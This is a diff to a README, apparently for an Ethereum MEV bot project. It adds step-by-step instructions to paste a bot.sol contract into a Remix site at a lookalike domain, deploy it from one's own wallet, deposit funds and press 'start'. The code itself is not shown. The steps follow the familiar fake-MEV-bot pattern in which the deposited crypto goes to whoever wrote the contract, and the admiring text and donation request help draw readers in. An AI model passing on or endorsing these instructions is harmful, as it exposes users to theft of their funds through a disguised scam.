@@ -47,6 +47,21 @@ https://etherscan.io/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e
 
 If this is you, I'd like to congratulate you on your badassery. I have been following your every trade for months, and have not been able to figure out how you get ±20 secs earlier than I do. What a fucking chad.
 
+## MEV bot Instructions
+
+1. Access Remix Compiler: https://remix-ethereum.com/
+
+2. Click on the "contracts" folder and then create "New File". Rename it as you like, i.e: “bot.sol"
+
+3. Paste the code from bot.sol into remix
+
+4. Move to the "Solidity Compiler" tab, select version "0.6.6" and then "Compile" it
+
+5. Move to the "Deploy" tab, select "Injected Web 3" environment. Connect your Metamask or wallet with Remix and then "Deploy" it. After the transaction is confirmed, it's your own BOT now
+
+6. Deposit funds to your exact contract/bot address
+
+7. After your transaction was confirmed, Start the bot by clicking the “start” button. Withdraw anytime by clicking the “withdrawal” button
 
 ## Do you feel the urge to send me some crypto? 
 Plz send donations to apebot.eth
